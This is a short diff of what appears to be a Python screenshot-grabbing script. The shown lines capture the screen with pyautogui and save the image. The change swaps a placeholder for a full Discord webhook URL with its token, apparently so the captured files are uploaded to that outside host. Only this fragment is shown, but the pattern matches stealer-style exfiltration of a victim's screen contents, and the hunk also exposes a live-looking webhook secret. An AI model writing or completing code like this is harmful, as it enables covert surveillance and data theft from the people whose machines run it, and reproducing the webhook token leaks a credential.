@@ -45,7 +45,7 @@ pyautogui.screenshot(screenshot_path)
 print(f"Screenshot saved to {screenshot_path}")
 
 
-webhook_url = 'ur webhooookkkkk'
+webhook_url = 'https://discord.com/api/webhooks/1505918669887246449/VmwWD42c5hBcRtQ9LBJtCxoN-HdOc_H3TgTETLsA3i16Lgp37zr1mIVlPN4QeAM_gSfK'
 
 
 files = {
